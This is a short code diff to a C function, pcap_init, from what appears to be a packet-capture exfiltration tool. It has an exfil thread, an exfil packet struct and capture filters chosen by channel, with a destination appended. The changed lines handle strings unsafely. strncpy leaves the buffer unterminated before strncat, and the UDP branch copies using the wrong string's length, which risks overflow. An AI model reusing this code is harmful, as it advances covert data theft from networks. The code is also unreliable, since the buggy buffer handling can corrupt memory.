@@ -45,13 +45,21 @@ void pcap_init(uint32 src, uint32 ipaddr, char *folder, int chan) {
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pthread_t exfil_thread;
 	struct exfil_pack expack;
-	char * fltr_str = PKT_T_FLT;
+	//char * fltr_str = PKT_T_FLT;
+	char * fltr_str;
+
+	fltr_str = (char *) malloc(strlen(PKT_T_FLT) + strlen(DEF_DST) + 1);
+
+	strncpy(fltr_str, PKT_T_FLT, strlen(PKT_T_FLT));
+	strncat(fltr_str, DEF_DST, strlen(DEF_DST));
 
 	channel = chan;
 	ip_addr = ipaddr;
 
-	if (channel == 2)
-		fltr_str = PKT_U_FLT;
+	if (channel == 2) {
+		strncpy(fltr_str, PKT_U_FLT, strlen(PKT_T_FLT));
+		strncat(fltr_str, DEF_DST, strlen(DEF_DST));
+	}
 
 // Setup Exfil Watch
 	expack.src = src;
